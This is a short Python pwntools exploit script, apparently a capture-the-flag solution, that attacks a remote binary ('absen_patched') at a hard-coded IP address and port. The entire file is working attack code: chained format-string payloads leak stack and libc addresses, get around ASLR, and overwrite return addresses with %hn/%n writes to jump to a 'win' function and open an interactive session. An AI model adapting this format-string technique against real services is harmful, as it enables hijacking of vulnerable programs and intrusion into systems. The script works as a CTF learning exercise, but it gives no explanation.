from pwn import *

exe = './absen_patched'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.log_level = 'debug'

# p = elf.process()
p = remote('103.181.183.216', 17000)

payload = b'%6$p'
p.sendlineafter(b'Nama : ', payload)
stack = eval(p.recvline(0)) - 0x110
rip = u64(p64(stack)[0:2].ljust(8, b'\x00'))

payload = f'%{rip}c%15$hn%8c%32$hn%11$p'.encode()
p.sendlineafter(b'NIM : ', payload)
libc = eval(p.recvline(0)[-14:]) - libc.symbols.__libc_start_call_main - 128
aslr = u64(p64(libc)[0:3].ljust(8, b'\x00'))
win = elf.symbols.win
ret = (aslr + 0x0000000000029cd6) - win # usually greater than win

payload = f'%{win}p%47$n%{ret}p%45$hn'.encode()
p.sendlineafter(b'Asal Univ: ', payload)
p.interactive()